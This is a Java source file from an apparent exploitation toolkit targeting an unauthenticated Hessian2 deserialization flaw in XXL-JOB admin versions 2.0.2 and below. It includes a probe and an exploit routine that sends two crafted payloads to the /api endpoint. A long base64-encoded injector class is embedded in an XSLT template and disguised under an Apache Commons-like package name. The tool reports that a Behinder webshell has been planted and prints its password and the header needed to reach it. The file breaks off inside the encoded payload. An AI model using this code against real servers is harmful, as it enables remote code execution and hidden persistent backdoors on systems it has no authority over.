package com.example.xxljobexp.exploit;

import com.caucho.hessian.io.Hessian2Output;
import com.example.xxljobexp.entity.ExecutionResult;
import com.example.xxljobexp.entity.Vulnerability;
import com.example.xxljobexp.utils.SerializeUtils;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class api_unauth implements Vulnerability {

    public api_unauth() {}

    public String getInfo() {
        String vulname = "XXL-JOB api unauth（admin管理端口漏洞，输入http://ip:port/xxl-job-admin进行检测和利用）";
        String desc = "XXL-JOB在2.0.2及以下版本中的接口存在未授权访问漏洞，该接口会进行Hessian2反序列化操作，导致存在Hessian2反序列化漏洞从而RCE。";
        String appVersion = "version <= 2.0.2";
        String fixRecommendation = "升级版本，或添加鉴权";
        String link = "https://forum.butian.net/share/2592";
        return String.format("--------------------------------------------------\n漏洞名称: %s\n\n漏洞描述: %s\n\n漏洞影响版本: %s\n\n漏洞修复方案: %s\n\n漏洞复现文章参考链接: %s\n\n--------------------------------------------------\n", vulname, desc, appVersion, fixRecommendation, link);
    }

    public ExecutionResult check(String url) throws Exception {
        try {
            URL targetUrl = new URL(url + "/api");
            HttpURLConnection connection = (HttpURLConnection)targetUrl.openConnection();
            connection.setRequestMethod("GET");
            connection.setInstanceFollowRedirects(false);
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            if (response.toString().contains("xxl-rpc request data") && connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                return new ExecutionResult(true, "XXL-JOB api auth", response.toString().split("empty")[0]+"empty...", (String)null);
            }
            return new ExecutionResult(false, "XXL-JOB api auth", (String)null, (String)null);
        } catch (Exception var10) {
            return new ExecutionResult(false, "XXL-JOB api auth", (String)null, (String)null);
        }
    }

    public ExecutionResult exploit(String url) throws Exception {
        api_unauth expolit = new api_unauth();
        // 第一个数据包
        sendExp(url, expolit.hessianPayload("writeXslt"));

        // 第二个数据包，稍微延迟或在新线程中发送可能更合适，取决于你的具体需求
        // 例如，使用 Thread.sleep 来实现延迟
        Thread.sleep(1000); // 延迟 1 秒
        sendExp(url, expolit.hessianPayload("loadXslt"));
        return new ExecutionResult(true, "XXL-JOB api auth", "empty...", "已写入冰蝎马，请尝试连接，未连接成功则为写入失败,exp会在xxl-job项目目录下生成1.xslt文件，地址：" + url + "/xxx, 密码: xxl-job-EXP，请求头: Referer: xxl-job-EXP");
    }


    private static String sendExp(String url, byte[] payload) throws Exception {
        // 创建 URL 对象
        URL targetUrl = new URL(url + "/api");

        // 打开连接
        HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
        // 设置请求方法为 POST
        connection.setRequestMethod("POST");
        // 设置内容类型为 x-application/hessian
        connection.setRequestProperty("Content-Type", "x-application/hessian");
        // 发送 POST 请求必须设置 DO_OUTPUT
        connection.setDoOutput(true);
        // 获取输出流并写入数据
        try (OutputStream os = connection.getOutputStream()) {
            os.write(payload);
            os.flush();
        }

        // 读取响应码
        int responseCode = connection.getResponseCode();

        // 根据响应码处理不同的逻辑
        StringBuilder response = new StringBuilder();
        if (responseCode == HttpURLConnection.HTTP_OK) { // 200 OK
            // 使用 BufferedReader 读取响应内容
            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }
            }
        } else {
            // 处理错误情况，例如读取错误流
            InputStream errorStream = connection.getErrorStream();
            if (errorStream != null) {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(errorStream))) {
                    String inputLine;
                    while ((inputLine = br.readLine()) != null) {
                        response.append(inputLine);
                    }
                }
            }
        }

        // 断开连接
        connection.disconnect();

        // 返回响应内容
        return response.toString();
    }

    /**
     * 注入器生成的时候使用
     * 注入器类名: org.apache.commons.aq.SerializationUtil
     */
    final static String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
            "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
            "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
            "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
            "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +
            ">\n" +
            "    <xsl:template match=\"/\">\n" +
            "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'yv66vgAAADEBewEAJ29yZy9hcGFjaGUvY29tbW9ucy9hcS9TZXJpYWxpemF0aW9uVXRpbAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAxnZXRDbGFzc05hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAC5jb20uZmFzdGVyeG1sLmphY2tzb24uQ29udGV4dExvYWRlckJ4cExpc3RlbmVyCAAIAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAAwBABBqYXZhL2xhbmcvU3RyaW5nBwAOAQvoSDRzSUFBQUFBQUFBQUpWWGVWeFUxeFgrTGpQd2htRk00cUFvMmlaeGgyRmdrR0Fra0VWQkNFUkE0NlFvRXRNK1poNHdPc3diMzN0RHdEYTJUVzI2cGVuZU5OMlhwTFNOYmJXTmcwbzF4aTVwMDMxSjkzMXYydjdmZjlMMHUrODlCaGdHc1QrR3Q5eDd6bmZPL2M1eTczdnV2K2N2QXRpS2Z3dlV4ZlRSeUpCcVdwb3hQcHFNSEZaalIwdzlGV25UVTVZMmJuWHJhbHd6V3NmVDNRbEtwRFJEZ1JCWWVWZ2RVeU5KTlRVY2FVdXFwdWxJS2ZBSWJKUlQ0eEZUTThhU21oV0pPdmQ5MnRHTVpscXpJTVVDSmJjbVVnbnJkZ0ZQVlhXZmdMZE5qMnNDMTNZblVscHZablJRTSs1UkI1TWNDWGJyTVRYWnB4b0orZTRPZXEyUmhDbFEzLzMvZWQ4U2dBS2ZIMTVjSTdDbXFydmdPbHFrT3lJbXNHcVJlUWx5blFRcHA5d3c2YWdhYUszT2wyM2gzS0JBMFVDclFGbGNHK0t5N0hIQ1VyeXJhNkZDQUpWWUkySFhDbHhuT0l6dDRyK2hUMmh4Z2MyT3U0dHgyejZtcFN6YjlYSno0WVRBaHF2UUp0bXUzUzZHSnFFbUU4ZWs1ZkpaVDl2SFkxcmFTdWdwQmV1NWNCY3paa3lrTFQzU2xraVBrQjRCbjZHWmFUMWxNbEQ1VG85WVZqclN5VXZPdmlOSkxjWFVUSlBRQWpjdXJtUkxVTmlqRHg2VzJXSzdsckVTeVVpUG1wWWc3Z0lFdGl4cDJSYWt6cm9sbVZGUUs3RHBxdkFVUkJpcnExdTBncTBDMTE5NXJRcHVFbGcyYjVrS3RuRW9hakhaK2VaV3hQSmh6WnJ2Q1htc3FyNWkxSmx5VGJqRmp6bzBDL2hITkpuZHZlcW9YWFN6TVk5YVJpSTFUTmxiY1ZzcGlzQ1NMYVd4VGxzOGw1ZnpaS3NMcWUvQXpqTFVROWFEWTZwUFRXYTBBSFk1c08zTStud3RCWGN5bTJLc1pqV1JZdW1zblZleUk2b1JsUXRKeGJTVzZvTUJkT0V1UHpxeFc2QmllSmJrRGtNZnpURnk5OUw1NkRDVFQ5eWllUnRBRDNyOTlIOFBLYlJqNENieCtnWGtMMGpqQU83R1BzbEpsUEdiRFhHbmFvN1lZWDZGSDMyNHhvY2E1bnM2US9lYjVxNS96K0JoTFdhMUxCeXBYamdVUUQ4T2x1Rm1EUGl3eVljdGJFNFpIMTdKUnBwbTZ3bEFkV0xBaHVXaklUc3dyS0FDa1MxZ3JTK0FPTFF5TkdLSWZ1NXNqL293NGphTnZOYWdnRFZiUnBLNlVxYWxNbXdDMVl0bVQzNWJDU0NKVVQrT2dOemVNRS9BVEdzeFpuYk0wS3pkMmtTVWJ3clNYQWtOdFU1WUd2UEdXMVU5MEJxQUFWTW1pT1gwNEFLRysyUnJIL1BqS082bmt0eWZwR2lYSTJscXNZeVJzQ1lpTkdLTFR1Q1k5T2ZWOHhMWFlVWEJBNDREYnM4dnJ5clU3MStMMS9seEhLOW5JOHViVlBBR2dXdG05SjE5UjZCeUlVcHVTM29qSHZMakJONGtVN0hjcWRCOWJvV3VtVkZMNkpIV3pOQ1FabWh4WjQ1NmI4WGJaQVkrektJcExLUGdFYnVqcTNHNU5RdXNxQ3BZM2UvRXUveDRCOTR0RUJoVVRlM214bDFhek43Ukt3cEZXRWJqdlhpZmRQYjliTnB4dlNPUlVwTThGTWl0VkU1K0FJOUpiajhZd0VwVVNMRVBNM05TMnYyem1UUGZqMXllZnhRZmt6eDhuRmdzWlRWcHl2MjVRTmF5WDN3U241TDBQODdDemUxckZDOG1kUjE5U3haYmdWYVhjMklTbjVFK2Y5YnQ3czVzcng3TnhFWTZFbG95UG1jYmZaS0pOcVlhMjJaMnZjVmxXeHpKK3ZuZDJiWHB6RzExYmcxTWxUa2loamFVcEV6RWhuTWx1YWtzTDNCa1diV0lsb0lzczV6RU1LcEpsYmxoandyVUx0SDg1NXNPNEN6T3llaWM1LzRsZTJVbXJSbXhwTjJCdmlKcjRRUXU1SVZyWG1VKzdjZEpYS0t1cVZrN1l6SFpSWjNUWU5WQktYQVpYL1ZqQ2w5akZ5SjQzczUwcGQ3NERUd3JGYi9KMk5PYlk4ZGtSdHJaYTh5Y2NmSk9QL0lBd29NWms5dk1wT3BHRTJhc3JuVm50SDBtNlEwZnZrZU1JZDNkVFRjdHdkSk1QL2dCZmlnNStCRnJ5TEh2VktJUFAzRUt1a2V6Um5TeXZxTUEzc0FDdkVKeGNCQm82cWY0bVRUMWM0SFZpMGtwK0NXTEtKRWEwNDl3RGJjVUlIUGdLdm45Tlg3ang2L3dXd1dyM1Y1Wkp6ZTZ1bGE3VWZqd0IyZnJ6SkgzSjlwMUNQRGhMOVRZdHEwK3JqVU9OVzZ0Mzk3VTBEZ1k5K0Z2cEhlZkpyc1V4Zi9CMWpBK25xdzlyQS9XdGgvWTY4TS9zWTdWNXdWaDRPR1Z1eHMvZDRROHdOajNYZmJkeHlmRnZwYnlyWjBhZ3ZkVm9TbGNHd3IrL1F4aW9lQUxaM0JIS1Bpdk0rZzR6YWtpK0htVmhRMVU4RzhWeXZnVWNOUjRYMmFEODl2QWhkeExTU203T2xRemhSVkxZNjRoeWxvYnM4TFJjekhsMDNJRWlTcGtOM1RSYitNQ3BWUnBxTVpUYzNFS0x6dVZneXV4WGJwaERsUnBEcXFVUmxiYlVDL0g5UzdVTmx1VHpwL09nOWc0QjBMa0lMai80a1liWXQwTWhIaWNHZ3JuTHRkazBYSUo5VDNoMEZPNDR4emFpbGhkVDg2KzhLRWppKzdIOEdnb1BJVzl2ZUZ6dUVlZzJUdU52djRwN0c4dXJpd09IdURndlI3czUrT2gydHpqZlpWZTk5a2JmQlZoWXVjdzdFRXdjUlo2YzBsbFNmRTBqdmJMNFN3eXdjUVV4ck40elRTSytrTlpQSmpGbTZmd2xzcVNFSUhmTHBERmU3SjROSXNQWmZHUkxENVJXWnpGRS9zblVkeGNNZ2x2NzJsNURtS2ptc1lHSnNjRlhPTGRZM1BTd1NnQVd6aGF6YjhRSXFqQmRvUjVzSzNGYmg2aSt6Z3l5SzlxSFEwWXcwMTRtRWVpc3p4elRaUGdDMmdtVWhPZVlSSktUanZsUVFPdFJOeEk1aUo0Qkp1d21YYTI0eUZhcUdKc2QrQUIyMHF4WkRYSC9XV1hleC9PMDNxWXZtN242R1o0WDZLWkVnVkZDdW9VMUN0b1VOQ28wTGhRc09FL0VLMjh5ZGp5c01ycnA2a2p5Mk9ESGY1T2prZ3JZZEZURXp4d0ZwOExIdUxsRWhwNkpsSFpXelBuemRmc25ZU0h2L0FwTzdlWFl3VXhWdEtuOVJLZTNuTG40N2hFZlo2cmthaE5va2ZHb0xjMmVQd0pWTlF5UDZhSnRLelpXNXZGeGQ3SmwxNElQNHZBTkU3MnMwaWVlVHJzemVMcllTcDg2eFQ5VzRaeVp0OUpsLzhHc2dDMEVYOFgyZXZnYkNmbnV5aHhGMU42TnhPNm05enNJYU43R1pGOWxJL2FYRGZTajlYOC96eSt3RlhUSTN3UnAydzJtM0NhZGNTdmRCTDFKWHlaZDM2UzRTbWNzU01CcnMvN0loUUZVd3BPOUNvNFdScVlRNTJRSnhoM3NTOHlpSEt4RThIdm44V1BlOExCNTcwWGNLTGZFK3lNWnZHTE1MT003OGY3UFRWOC9kMGwvRDczTzlVVC9DTTF5TTZmUGRTZ3NPRDlPS1dhdlpYazRzSGdYK2NpVlhvWHc3SHJ0WjdlejJUckdyb0VIdnRMY0pDakEyVGpYcTczRURtNnoyYmxkczZVTUllZTQycUxPTFBUZnZKd3ZoYmZKajllYXR4SnpyNWpWLzlFTGdNbjhGMmJzKzFPbHpncUUydVdGUHdQL1lxMkFGd1NBQUE9CAAQAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAASABMKAA8AFAEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABcBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAhsaXN0ZW5lcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB2NvbnRleHQBAAhjb250ZXh0cwEAEExqYXZhL3V0aWwvTGlzdDsBAAR0aGlzAQApTG9yZy9hcGFjaGUvY29tbW9ucy9hcS9TZXJpYWxpemF0aW9uVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBNAQAQamF2YS9sYW5nL1RocmVhZAcATwEAEWphdmEvdXRpbC9IYXNoTWFwBwBRAQATamF2YS91dGlsL0FycmF5TGlzdAcAUwoAVAApAQAKZ2V0VGhyZWFkcwgAVgEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABYAFkKAAIAWgEAB2dldE5hbWUMAFwABgoAUABdAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAXwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABhAGIKAA8AYwEABnRhcmdldAgAZQEABWdldEZWDABnAFkKAAIAaAEABnRoaXMkMAgAaggARAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABtAG4KAFIAbwEADWphdmEvdXRpbC9TZXQHAHELAHIAMQEAA2dldAwAdAA8CgBSAHUBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHcAeAoABAB5AQAPamF2YS9sYW5nL0NsYXNzBwB7CgB8AF0BAA9TdGFuZGFyZENvbnRleHQIAH4BAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIAAgQsAJQCCAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACEAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAhgCHCgBQAIgBAAh0b1N0cmluZwwAigAGCgB8AIsBABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACNAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAjwEACXJlc291cmNlcwgAkQgAHQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCUAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAASAJYKAJUAlwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCZAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAmwEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAJ0BAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKEBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAqwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwArQCuCgBQAK8BAA5nZXRDbGFzc0xvYWRlcgwAsQCHCgB8ALIMAAUABgoAAgC0AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAtgC3CgCsALgBAAtuZXdJbnN0YW5jZQwAugA4CgB8ALsMAAoABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKUHAKQBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqAkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAHwA0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMAOUA5goAAgDnAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyCADpAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABYAOsKAAIA7AEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAO4HAOEBABBqYXZhL3V0aWwvQXJyYXlzBwDxAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwA8wD0CgDyAPUBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAASAPcKAFQA+AoAVACCAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA+wEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAP0A/goAVAD/AQABaQEAAUkBAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEc2l6ZQEAAygpSQwBBQEGCgBUAQcBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAHQBCQoAVAEKAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAREBAAdmb3JOYW1lDAETALcKAHwBFAEADGRlY29kZUJ1ZmZlcggBFgEACWdldE1ldGhvZAwBGADPCgB8ARkBABBqYXZhLnV0aWwuQmFzZTY0CAEbAQAKZ2V0RGVjb2RlcggBHQEABmRlY29kZQgBHwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwEhAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEsAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBLgEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwEwCgEtACkBAAUoW0IpVgwAEgEzCgEvATQBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABIBNgoBMQE3AQAEcmVhZAEABShbQilJDAE5AToKATEBOwEABXdyaXRlAQAHKFtCSUkpVgwBPQE+CgEtAT8BAAt0b0J5dGVBcnJheQEABCgpW0IMAUEBQgoBLQFDAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBSQFKCgACAUsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBTQoBTgDWCgFOAHUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAVEBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAVQBVQoAfAFWAQANZ2V0U3VwZXJjbGFzcwwBWAB4CgB8AVkKAVIAFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEABm1ldGhvZAEACXRlbXBDbGFzcwcBXwEAEmdldERlY2xhcmVkTWV0aG9kcwEAHSgpW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAFoAWkKAHwBagoA0wBdAQAGZXF1YWxzDAFtAIEKAA8BbgEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsMAXABcQoA0wFyCgCcABQBAApnZXRNZXNzYWdlDAF1AAYKAJoBdgoAlQAUAQAIPGNsaW5pdD4KAAIAKQAhAAIABAAAAAAADgABAAUABgABAAcAAAAQAAEAAQAAAAQTAAmwAAAAAAABAAoABgACAAsAAAAEAAEADQAHAAAAFwADAAEAAAALuwAPWRMAEbcAFbAAAAAAAAEAEgAWAAEABwAAANgAAwAFAAAANiq3ACoqtgAuTCu5ADIBAE0suQA2AQCZABssuQA6AQBOKi23AD46BCotGQS2AEKn/+KnAARMsQABAAQAMQA0ABgABAAZAAAAJgAJAAAAJAAEACYACQAnACAAKAAnACkALgAq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